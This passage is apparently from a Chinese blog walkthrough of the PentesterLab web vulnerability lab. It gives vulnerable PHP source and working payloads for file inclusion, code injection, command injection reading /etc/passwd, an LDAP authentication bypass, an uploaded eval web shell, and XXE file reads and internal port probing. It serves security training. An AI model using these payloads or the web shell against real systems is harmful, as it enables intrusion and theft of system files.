<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$path = preg_replace(&#x27;/\x00.*/&#x27;,&quot;&quot;,$path);</span><br></pre></td></tr></table></figure></li>
<li><p>但是关键过滤的正则写的有问题:<code>\x00.*</code>，他会把 00 截断的后面也给替换为空，刚好可以把 .png 给干掉</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/dirtrav/example3.php?file=../../../../../../../etc/passwd%00</span><br></pre></td></tr></table></figure></li>
</ol>
<h1 id="File-Include"><a href="#File-Include" class="headerlink" title="File Include"></a>File Include</h1><h2 id="Example-1-1"><a href="#Example-1-1" class="headerlink" title="Example 1"></a>Example 1</h2><p><strong>关键代码</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php require_once &#x27;../header.php&#x27;; ?&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">    if ($_GET[&quot;page&quot;]) &#123;</span><br><span class="line">        include($_GET[&quot;page&quot;]);</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.189.128/fileincl/example1.php?page=/etc/passwd  //本地文件</span><br><span class="line">http://192.168.189.128/fileincl/example1.php?page=http://www.baidu.com/robots.txt  //远程文件包含</span><br></pre></td></tr></table></figure>

<h2 id="Example-2-截断"><a href="#Example-2-截断" class="headerlink" title="Example 2 截断"></a>Example 2 截断</h2><p><strong>关键代码</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    if ($_GET[&quot;page&quot;]) &#123;</span><br><span class="line">    $file = $_GET[&quot;page&quot;].&quot;.php&quot;;</span><br><span class="line">    // simulate null byte issue</span><br><span class="line">    $file = preg_replace(&#x27;/\x00.*/&#x27;,&quot;&quot;,$file);</span><br><span class="line">        include($file);</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">虽然在 page 后面手动添加了 .php 后缀了，但是下面在正则依然是\x00.*谜一样的操作，依然是吧 00 截断以及后面的内容都替换为空，这样间接地帮助我们把 .php 给干掉了，美滋滋，直接丢 payload 吧:</span><br><span class="line">/fileincl/example2.php?page=/etc/passwd%00</span><br><span class="line">/fileincl/example2.php?page=https://www.baidu.com/robots.txt%23</span><br></pre></td></tr></table></figure>



<h1 id="Code-injection"><a href="#Code-injection" class="headerlink" title="Code injection"></a>Code injection</h1><h2 id="Example-1-2"><a href="#Example-1-2" class="headerlink" title="Example 1"></a>Example 1</h2><p><strong>关键代码</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">  $str=&quot;echo \&quot;Hello &quot;.$_GET[&#x27;name&#x27;].&quot;!!!\&quot;;&quot;;</span><br><span class="line">  eval($str);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<ol>
<li><p>这样当用户 name 传递非法字符的时候，就会产生代码注入，但是注入前我们需要闭合好原来的语句，然后注释掉后面的语句</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo \&quot;Hello &quot;.$_GET[&#x27;name&#x27;].&quot;!!!\&quot;;</span><br><span class="line">echo \&quot;Hello &quot;aaa&quot;;phpinfo();// &quot;!!!\&quot;;</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="Example-2-create-function-命令注入"><a href="#Example-2-create-function-命令注入" class="headerlink" title="Example 2 create_function 命令注入"></a>Example 2 create_function 命令注入</h2><p><strong>关键代码</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class User&#123;</span><br><span class="line">  public $id, $name, $age;</span><br><span class="line">  function __construct($id, $name, $age)&#123;</span><br><span class="line">    $this-&gt;name= $name;</span><br><span class="line">    $this-&gt;age = $age;</span><br><span class="line">    $this-&gt;id = $id;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">    $sql = &quot;SELECT * FROM users &quot;;</span><br><span class="line"></span><br><span class="line">    $order = $_GET[&quot;order&quot;];</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">  if ($result) &#123;</span><br><span class="line">        while ($row = mysql_fetch_assoc($result)) &#123;</span><br><span class="line">      $users[] = new User($row[&#x27;id&#x27;],$row[&#x27;name&#x27;],$row[&#x27;age&#x27;]);</span><br><span class="line">    &#125;</span><br><span class="line">    if (isset($order)) &#123;</span><br><span class="line">      # 使用用户自定义的比较函数对数组进行排序</span><br><span class="line">      usort($users, create_function(&#x27;$a, $b&#x27;, &#x27;return strcmp($a-&gt;&#x27;.$order.&#x27;,$b-&gt;&#x27;.$order.&#x27;);&#x27;));</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<ol>
<li><p>尝试闭合掉这个 create_function 来进行代码注入：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">if (isset($order)) &#123;</span><br><span class="line">      # 使用用户自定义的比较函数对数组进行排序</span><br><span class="line">      usort($users, create_function(&#x27;$a, $b&#x27;, &#x27;return strcmp($a-&gt;&#x27;.$order.&#x27;,$b-&gt;&#x27;.$order.&#x27;);&#x27;));</span><br><span class="line">    &#125;</span><br><span class="line">相当于：</span><br><span class="line">create_function CF($a, $b)</span><br><span class="line">	return strcmp($a-&gt;&#x27;.$order.&#x27;,$b-&gt;&#x27;.$order.&#x27;);&#x27;));  </span><br><span class="line"></span><br><span class="line">order=id);&#125;phpinfo();//</span><br><span class="line"></span><br><span class="line">return strcmp($a-&gt;id);&#125;phpinfo();//,$b-&gt;id);&#125;phpinfo();//);</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="Example-3-preg-replace-命令注入"><a href="#Example-3-preg-replace-命令注入" class="headerlink" title="Example 3 preg_replace 命令注入"></a>Example 3 preg_replace 命令注入</h2><p><strong>关键代码</strong>:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> preg_replace(<span class="variable">$_GET</span>[<span class="string">&quot;pattern&quot;</span>], <span class="variable">$_GET</span>[<span class="string">&quot;new&quot;</span>], <span class="variable">$_GET</span>[<span class="string">&quot;base&quot;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ol>
<li><p>$pattern 在 /e 模式下会将新输入 $replacement参数的值当成 PHP 代码执行，知道这个原理后我最终构造的 payload 如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">new=phpinfo();&amp;pattern=/lamer/e&amp;base=Hello lamer</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="Example-4-assert-命令注入"><a href="#Example-4-assert-命令注入" class="headerlink" title="Example 4 assert 命令注入"></a>Example 4 assert 命令注入</h2><p><strong>关键代码</strong>:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="comment">// ensure name is not empty</span></span><br><span class="line">  assert(trim(<span class="string">&quot;&#x27;&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>].<span class="string">&quot;&#x27;&quot;</span>));</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;Hello &quot;</span>.htmlentities(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p><strong>trim</strong></p>
<p>移除字符串两侧的空白字符或其他预定义字符</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">trim(<span class="keyword">string</span>,charlist)</span><br><span class="line"><span class="keyword">string</span>	必需。规定要检查的字符串。</span><br><span class="line">charlist	可选。规定从字符串中删除哪些字符。如果被省略，则移除以下所有字符：</span><br><span class="line">“\<span class="number">0</span>” - <span class="literal">NULL</span></span><br><span class="line">“\t” - 制表符</span><br><span class="line">“\n” - 换行</span><br><span class="line">“\x0B” - 垂直制表符</span><br><span class="line">“\r” - 回车</span><br><span class="line">“ “ - 空格</span><br></pre></td></tr></table></figure></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">name=hacker&#x27;.phpinfo();//</span><br><span class="line"></span><br><span class="line">assert(trim(&#x27;hacker&#x27;.phpinfo();//&#x27;));</span><br></pre></td></tr></table></figure>



<h1 id="Commands-injection"><a href="#Commands-injection" class="headerlink" title="Commands injection"></a>Commands injection</h1><h2 id="Example-1-3"><a href="#Example-1-3" class="headerlink" title="Example 1"></a>Example 1</h2><p><strong>关键代码</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">  system(&quot;ping -c 2 &quot;.$_GET[&#x27;ip&#x27;]);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/pre&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.189.128/commandexec/example1.php?ip=127.0.0.1;cat%20/etc/passwd</span><br></pre></td></tr></table></figure>

<h2 id="Example-2-0a-绕过"><a href="#Example-2-0a-绕过" class="headerlink" title="Example 2 %0a 绕过"></a>Example 2 %0a 绕过</h2><p><strong>关键代码</strong>：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;pre&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">if</span> (!(preg_match(<span class="string">&#x27;/^\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;.\d&#123;1,3&#125;$/m&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>]))) &#123;</span><br><span class="line">     <span class="keyword">die</span>(<span class="string">&quot;Invalid IP address&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  system(<span class="string">&quot;ping -c 2 &quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/pre&gt;</span><br></pre></td></tr></table></figure>

<p>这一关使用了 preg_match 正则检测我们输入的 ip ，如果 ip 不是 IP 格式的话就直接终止函数运行，但是这里使用了 <code>/m</code> 多行匹配模式，所以我们这里可以使用 <code>%0a</code> 换行，后面跟上自己的 payload 即可：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/commandexec/example2.php?ip=127.0.0.1%0acat /etc/passwd</span><br></pre></td></tr></table></figure>

<h2 id="Example-3-重定向捕捉"><a href="#Example-3-重定向捕捉" class="headerlink" title="Example 3 重定向捕捉"></a>Example 3 重定向捕捉</h2><p><strong>关键代码</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;pre&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">  if (!(preg_match(&#x27;/^\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;.\d&#123;1,3&#125;$/&#x27;, $_GET[&#x27;ip&#x27;]))) &#123;</span><br><span class="line">     header(&quot;Location: example3.php?ip=127.0.0.1&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  system(&quot;ping -c 2 &quot;.$_GET[&#x27;ip&#x27;]);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/pre&gt;</span><br></pre></td></tr></table></figure>

<ol>
<li>虽然重定向了，但是实际上代码还是执行了我们的输入，只是重定向后刷新了一下，我们没有看到执行结果</li>
<li>可以使用 BP 抓包来查看返回包，也可以直接使用 curl 命令来查看短暂出现的运行结果：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&quot;http://10.211.55.20/commandexec/example3.php?ip=127.0.0.1;cat%20/etc/passwd&quot;</span></span><br></pre></td></tr></table></figure>

<h1 id="LDAP-attacks"><a href="#LDAP-attacks" class="headerlink" title="LDAP attacks"></a>LDAP attacks</h1><blockquote>
<p>LDAP 是轻量目录访问协议，英文全称是 Lightweight Directory Access Protocol，一般都简称为 LDAP。</p>
<p>LDAP 是一个为查询、浏览、搜索而优化的专业分布式数据库，它成树状结构组织数据，就好像 Linux/Unix 系统中的文件目录一样。目录数据库和关系数据库不同，它有优异的读性能，但写性能差，并且没有事务处理、回滚等复杂功能，不适于存储修改频繁的数据。所以 LDAP 天生是用来查询的。</p>
</blockquote>
<h2 id="Example-1-空认证"><a href="#Example-1-空认证" class="headerlink" title="Example 1 空认证"></a>Example 1 空认证</h2><p>源码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$ld = ldap_connect(&quot;localhost&quot;) or die(&quot;Could not connect to LDAP server&quot;);</span><br><span class="line">ldap_set_option($ld, LDAP_OPT_PROTOCOL_VERSION, 3);</span><br><span class="line">ldap_set_option($ld, LDAP_OPT_REFERRALS, 0);</span><br><span class="line">if ($ld) &#123;</span><br><span class="line">  if (isset($_GET[&quot;username&quot;])) &#123;</span><br><span class="line">    $user = &quot;uid=&quot;.$_GET[&quot;username&quot;].&quot;ou=people,dc=pentesterlab,dc=com&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">  $lb = @ldap_bind($ld, $user,$_GET[&quot;password&quot;]);</span><br><span class="line"></span><br><span class="line">  if ($lb) &#123;</span><br><span class="line">    echo &quot;AUTHENTICATED&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">  else &#123;</span><br><span class="line">    echo &quot;NOT AUTHENTICATED&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol>
<li><p>使用用户名和密码连接到 LDAP 服务器。在这里 LDAP 服务器身份验证不会成功，因为 <code>username=&amp;password=</code>凭据无效。但是，一些 LDAP 服务器授权空绑定：如果发送空值，LDAP 服务器将继续绑定连接，要使用空值获取绑定，需要从查询中完全删除此参数，PHP 代码将认为凭据是正确的:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.189.128/ldap/example1.php</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="Example-2-LDAP-注入"><a href="#Example-2-LDAP-注入" class="headerlink" title="Example 2 LDAP 注入"></a>Example 2 LDAP 注入</h2><p>源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ld</span> = ldap_connect(<span class="string">&quot;localhost&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Could not connect to LDAP server&quot;</span>);</span><br><span class="line">ldap_set_option(<span class="variable">$ld</span>, LDAP_OPT_PROTOCOL_VERSION, <span class="number">3</span>);</span><br><span class="line">ldap_set_option(<span class="variable">$ld</span>, LDAP_OPT_REFERRALS, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$ld</span>) &#123;</span><br><span class="line">  <span class="variable">$lb</span> = @ldap_bind(<span class="variable">$ld</span>, <span class="string">&quot;cn=admin,dc=pentesterlab,dc=com&quot;</span>, <span class="string">&quot;pentesterlab&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (<span class="variable">$lb</span>) &#123;</span><br><span class="line">    <span class="variable">$pass</span> = <span class="string">&quot;&#123;MD5&#125;&quot;</span>.base64_encode(pack(<span class="string">&quot;H*&quot;</span>,md5(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>])));</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&quot;(&amp;(cn=&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>].<span class="string">&quot;)(userPassword=&quot;</span>.<span class="variable">$pass</span>.<span class="string">&quot;))&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (!(<span class="variable">$search</span>=@ldap_search(<span class="variable">$ld</span>, <span class="string">&quot;ou=people,dc=pentesterlab,dc=com&quot;</span>, <span class="variable">$filter</span>))) &#123;</span><br><span class="line">      <span class="keyword">echo</span>(<span class="string">&quot;Unable to search ldap server&lt;br&gt;&quot;</span>);</span><br><span class="line">      <span class="keyword">echo</span>(<span class="string">&quot;msg:&#x27;&quot;</span>.ldap_error(<span class="variable">$ld</span>).<span class="string">&quot;&#x27;&lt;/br&gt;&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="variable">$number_returned</span> = ldap_count_entries(<span class="variable">$ld</span>,<span class="variable">$search</span>);</span><br><span class="line">      <span class="variable">$info</span> = ldap_get_entries(<span class="variable">$ld</span>, <span class="variable">$search</span>);</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable">$info</span>[<span class="string">&quot;count&quot;</span>] &lt; <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="comment">//NOK</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;UNAUTHENTICATED&quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;AUTHENTICATED as&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot; &quot;</span>.htmlentities(<span class="variable">$info</span>[<span class="number">0</span>][<span class="string">&#x27;uid&#x27;</span>][<span class="number">0</span>]));</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>LDAP 查询的基本语法：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># 查询name为Tom的所有对象 这里括号强调LDAP语句的开始和结束</span><br><span class="line">(name=Tom)</span><br><span class="line"></span><br><span class="line"># 查询name为Tom并且passwd为123的对象</span><br><span class="line"># 每个条件都在自己的括号里面，整个语句也要括号包裹起来。&amp;表示逻辑与。</span><br><span class="line">(&amp;(name=Tom)(passwd=123)) </span><br><span class="line"></span><br><span class="line"># 查询名字是T开头的所有对象 通配符*可以表示任何值</span><br><span class="line">(name=T*) </span><br></pre></td></tr></table></figure>

<ol>
<li><p>简单测试</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 认证成功 默认正常情况</span><br><span class="line">name=hacker&amp;password=hacker </span><br><span class="line"></span><br><span class="line"># 认证成功 通配符 可以表示 hacker</span><br><span class="line">name=ha*&amp;password=hacker</span><br><span class="line"></span><br><span class="line"># 认证失败 因为 password 被 md5 家了</span><br><span class="line">name=hacker&amp;password=ha*</span><br></pre></td></tr></table></figure></li>
<li><p>找到关键代码，对密码做了md5加密，查询是否和数据库加密的密码相同</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$pass = &quot;&#123;MD5&#125;&quot;.base64_encode(pack(&quot;H*&quot;,md5($_GET[&#x27;password&#x27;])));</span><br><span class="line">$filter = &quot;(&amp;(cn=&quot;.$_GET[&#x27;name&#x27;].&quot;)(userPassword=&quot;.$pass.&quot;))&quot;;</span><br></pre></td></tr></table></figure></li>
<li><p><code>)</code>用来闭合前面的括号，<code>(cn=*)</code>是一个永真的条件，<code>%00</code>注释掉后面的语句。即可绕过密码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hacker)(cn=*))%00</span><br><span class="line">$filter = &quot;(&amp;(cn=hacker)(cn=*))%00)(userPassword=&quot;.$pass.&quot;))&quot;;</span><br></pre></td></tr></table></figure></li>
</ol>
<h1 id="File-Upload"><a href="#File-Upload" class="headerlink" title="File Upload"></a>File Upload</h1><h2 id="Example-1-4"><a href="#Example-1-4" class="headerlink" title="Example 1"></a>Example 1</h2><p>源码：</p>
<p><img src="http://test-123456-imgsubmit.oss-cn-beijing.aliyuncs.com/img/image-20210321151251401.png" alt="image-20210321151251401"></p>
<ol>
<li><p>查看源码并没有什么过滤机制，直接上传php一句话木马</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&#x27;cmd&#x27;]);?&gt;</span><br></pre></td></tr></table></figure></li>
<li><p>直接用蚁剑连接</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.189.128/upload/images/shell.php</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="Example-1-5"><a href="#Example-1-5" class="headerlink" title="Example 1"></a>Example 1</h2><p>源码：</p>
<p><img src="http://test-123456-imgsubmit.oss-cn-beijing.aliyuncs.com/img/image-20210321152058118.png"></p>
<ol>
<li><p>查看源码，发现上传文件只过滤了.php后缀，可以修改成后缀.php.111/.php.jpg的文件上传(apache的解析漏洞) %00 截断、</p>
<p>或大小写绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&#x27;cmd&#x27;]);?&gt;</span><br></pre></td></tr></table></figure></li>
<li><p>用蚁剑进行连接</p>
</li>
</ol>
<h1 id="XML-attacks"><a href="#XML-attacks" class="headerlink" title="XML attacks"></a>XML attacks</h1><blockquote>
<p>XML注入即XXE（XML外部实体注入），是指利用可控的参数或入口来加载不可控的参数或代码，造成不可控的运行结果。</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ENTITY实体：如果在XML文档中需要频繁使用某一条数据，可以预先给这个数据起一个别名。即一个ENTITY，然后再在文档中调用它。</span><br><span class="line">XML定义了两种类型的ENTITY，一种在XML文档中使用，另一种在为参数在DTD文件中使用。</span><br><span class="line">定义语法：&lt;!DOCTYPE  文件名 [ &lt;!ENTITY  实体名 &quot;实体内容&quot;&gt; ] &gt;</span><br><span class="line">定义好的ENTITY在文档中通过“&amp;实体名;”来使用。</span><br><span class="line"></span><br><span class="line">正常来说，DTD分为内部DTD与外部DTD，内部DTD包含在XML文档中,外部DTD则通过URL引用。一个DTD文件是以.dtd结尾的文本文件 。前面还要加上SYSTEM，但是如果此处没有任何过滤，我们完全可以引用系统敏感文件的，前提是页面有回显，否则你只引用了文件但不知道文件内容。</span><br></pre></td></tr></table></figure>

<h2 id="Example-1-6"><a href="#Example-1-6" class="headerlink" title="Example 1"></a>Example 1</h2><p>源码：</p>
<p><img src="http://test-123456-imgsubmit.oss-cn-beijing.aliyuncs.com/img/2018051411093478" alt="img"></p>
<p>simplexml_load_string() 函数转换形式良好的XML字符串为SimpleXMLElement对象。</p>
<p>print_r()可以把字符串和数字简单地打印出来。</p>
<ol>
<li>先尝试简单的构造</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE GVI [&lt;!ENTITY xxe &quot;http://127.0.0.1:8080&quot; &gt;]&gt;</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>出现报错，然后换为URL编码后的再进行测试：</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.189.128/xml/example1.php?xml=&lt;!DOCTYPE GVI [&lt;!ENTITY xxe &quot;http://127.0.0.1:8080&quot; &gt;]&gt;&lt;test&gt;%26xxe;&lt;/test&gt;</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>没问题，正常输出。接着直接运行payload：</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.189.128/xml/example1.php?xml=&lt;!DOCTYPE GVI [&lt;!ENTITY xxe SYSTEM=&quot;file:///etc/passwd&quot; &gt;]&gt;&lt;test&gt;%26xxe;&lt;/test&gt;     //伪协议读取本地文件</span><br><span class="line">http://192.168.189.128/xml/example1.php?xml=&lt;!DOCTYPE GVI [&lt;!ENTITY xxe SYSTEM &quot;http://127.0.0.1:8080&quot; &gt;]&gt;&lt;test&gt;%26xxe;&lt;/test&gt;    //内网端口探测</span><br></pre></td></tr></table></figure>

<h2 id="Example2："><a href="#Example2：" class="headerlink" title="Example2："></a>Example2：</h2><p>源码：</p>
<p><img src="http://test-123456-imgsubmit.oss-cn-beijing.aliyuncs.com/img/20180514111455561" alt="img"></p>
<p>list()函数用于在一次操作中给一组变量赋值。</p>
<p>each()函数返回当前元素的键名和键值，并将内部指针向前移动。</p>
<p>xpath()函数运行对XML文档的XPath查询。</p>
<p>可以看到源代码先定义了一个$x变量，里面包含了一个xml。然后把的XML字符串转换为SimpleXMLElement对象，并赋值给$res，然后查询了users里user里的name值为$name的，并返回其所有父节点的message里面的值。然后执行查询，最后while循环显示查询的值。</p>
<p><strong>整个XML格式如下：</strong></p>
